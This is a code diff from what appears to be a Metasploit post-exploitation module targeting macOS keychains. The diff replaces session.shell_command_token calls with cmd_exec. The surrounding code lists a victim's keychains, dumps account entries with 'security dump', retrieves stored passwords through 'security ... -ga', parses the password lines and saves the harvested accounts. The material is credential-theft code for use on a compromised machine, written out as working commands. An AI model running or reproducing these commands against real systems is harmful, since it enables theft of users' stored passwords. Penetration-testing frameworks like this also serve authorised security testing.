@@ -29,16 +29,16 @@ class Metasploit3 < Msf::Post
   end
 
   def list_keychains
-    keychains = session.shell_command_token("security list")
-    user = session.shell_command_token("whoami")
+    keychains = cmd_exec("security list")
+    user = cmd_exec("whoami")
     print_status("The following keychains for #{user.strip} were found:")
     print_line(keychains.chomp)
     return keychains =~ /No such file or directory/ ? nil : keychains
   end
 
   def enum_accounts(keychains)
-    user =  session.shell_command_token("whoami").chomp
-    out = session.shell_command_token("security dump | egrep 'acct|desc|srvr|svce'")
+    user =  cmd_exec("whoami").chomp
+    out = cmd_exec("security dump | egrep 'acct|desc|srvr|svce'")
 
     i = 0
     accounts = {}
@@ -73,7 +73,7 @@ class Metasploit3 < Msf::Post
         s = accounts[num]["svce"]
       end
 
-      cmd = session.shell_command_token("security #{c} -ga \"#{accounts[num]["acct"]}\" -s \"#{s}\" 2>&1")
+      cmd = cmd_exec("security #{c} -ga \"#{accounts[num]["acct"]}\" -s \"#{s}\" 2>&1")
 
       cmd.split("\n").each do |line|
         if line =~ /password: /
@@ -109,7 +109,7 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    user = session.shell_command_token("/usr/bin/whoami").chomp
+    user = cmd_exec("/usr/bin/whoami").chomp
     accounts = enum_accounts(keychains)
     save(accounts)
 
